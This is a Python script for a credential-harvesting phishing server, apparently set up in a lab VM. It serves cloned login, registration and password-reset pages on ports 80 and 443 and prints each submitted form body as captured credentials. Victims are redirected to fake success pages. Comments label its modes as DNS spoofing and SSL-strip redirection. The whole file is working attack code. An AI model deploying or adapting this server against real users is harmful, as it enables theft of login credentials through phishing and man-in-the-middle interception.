import http.server
import ssl
import socketserver
import threading
import os
import sys

# --- CONFIGURATION ---
SERVER_IP = "192.168.1.30"   # <--- Match your VM IP
PORT_HTTP = 80
PORT_HTTPS = 443
BASE_DIR = "pages"           
SUCCESS_DIR = "success"

# CHECK COMMAND LINE ARGUMENTS
# If true, Port 80 will SERVE the site instead of REDIRECTING
HTTP_ONLY_MODE = "--http" in sys.argv 
# ---------------------

def serve_content(handler):
    """
    Helper function to locate and serve files from the 'pages' folder.
    Used by both HTTP and HTTPS handlers depending on mode.
    """
    if handler.path == '/': handler.path = '/index.html'
    
    clean_path = handler.path.lstrip('/')
    
    if "success" in clean_path:
        file_path = os.path.join(BASE_DIR, SUCCESS_DIR, os.path.basename(clean_path))
    else:
        file_path = os.path.join(BASE_DIR, clean_path)

    try:
        with open(file_path, 'rb') as f:
            handler.send_response(200)
            if file_path.endswith(".html"): handler.send_header('Content-type', 'text/html')
            elif file_path.endswith(".css"): handler.send_header('Content-type', 'text/css')
            handler.end_headers()
            handler.wfile.write(f.read())
    except FileNotFoundError:
        handler.send_error(404, "File Not Found")

def handle_post(handler, protocol_name):
    """
    Helper function to capture credentials and redirect to success page.
    """
    try:
        length = int(handler.headers.get('Content-Length', 0))
        data = handler.rfile.read(length).decode('utf-8')
        print(f"\n[+] CAPTURED ({protocol_name}): {data}")
        
        if handler.path == '/register': redirect = '/register_success.html'
        elif handler.path == '/forgot': redirect = '/forgot_success.html'
        else: redirect = '/dashboard.html'
        
        handler.send_response(303)
        handler.send_header('Location', redirect)
        handler.end_headers()
    except Exception as e:
        print(f"[!] POST Error: {e}")

# --- HANDLERS ---

class HTTPSRequestHandler(http.server.SimpleHTTPRequestHandler):
    """ Always serves content securely on Port 443 """
    def do_GET(self): serve_content(self)
    def do_POST(self): handle_post(self, "HTTPS")

class HTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    """ 
    Port 80 Handler. Behavior changes based on HTTP_ONLY_MODE flag.
    """
    def do_GET(self):
        if HTTP_ONLY_MODE:
            # MODE: DNS SPOOFING (Serve content directly, no SSL)
            serve_content(self)
        else:
            # MODE: SSL STRIP (Force Redirect to HTTPS)
            self.send_response(301)
            new_url = f"https://{SERVER_IP}{self.path}"
            self.send_header('Location', new_url)
            self.end_headers()
            print(f"[HTTP] Redirecting to {new_url}")

    def do_POST(self):
        if HTTP_ONLY_MODE:
            # MODE: DNS SPOOFING (Capture and show dashboard)
            handle_post(self, "HTTP")
        else:
            # MODE: SSL STRIP (If raw POST hits here, redirect to HTTPS)
            self.send_response(307)
            new_url = f"https://{SERVER_IP}{self.path}"
            self.send_header('Location', new_url)
            self.end_headers()

    def log_message(self, format, *args): return

# --- SERVER RUNNERS ---

def run_http_server():
    socketserver.TCPServer.allow_reuse_address = True
    try:
        httpd = socketserver.TCPServer(("", PORT_HTTP), HTTPRequestHandler)
        mode_str = "DIRECT SERVING" if HTTP_ONLY_MODE else "FORCED REDIRECT"
        print(f"[*] HTTP Server running on Port {PORT_HTTP} [{mode_str}]")
        httpd.serve_forever()
    except OSError as e: print(f"[!] Port 80 Error: {e}")

def run_https_server():
    if not os.path.exists("cert.pem"): return
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain("cert.pem", "key.pem")
    
    socketserver.TCPServer.allow_reuse_address = True
    try:
        httpd = socketserver.TCPServer(("", PORT_HTTPS), HTTPSRequestHandler)
        httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
        print(f"[*] HTTPS Server running on Port {PORT_HTTPS}")
        httpd.serve_forever()
    except OSError as e: print(f"[!] Port 443 Error: {e}")

if __name__ == "__main__":
    if not os.path.exists(BASE_DIR):
        print(f"[!] Error: '{BASE_DIR}' folder not found.")
        sys.exit(1)

    t1 = threading.Thread(target=run_http_server, daemon=True)
    t2 = threading.Thread(target=run_https_server, daemon=True)
    t1.start()
    t2.start()
    
    try:
        t1.join()
        t2.join()
    except KeyboardInterrupt:
        sys.exit(0)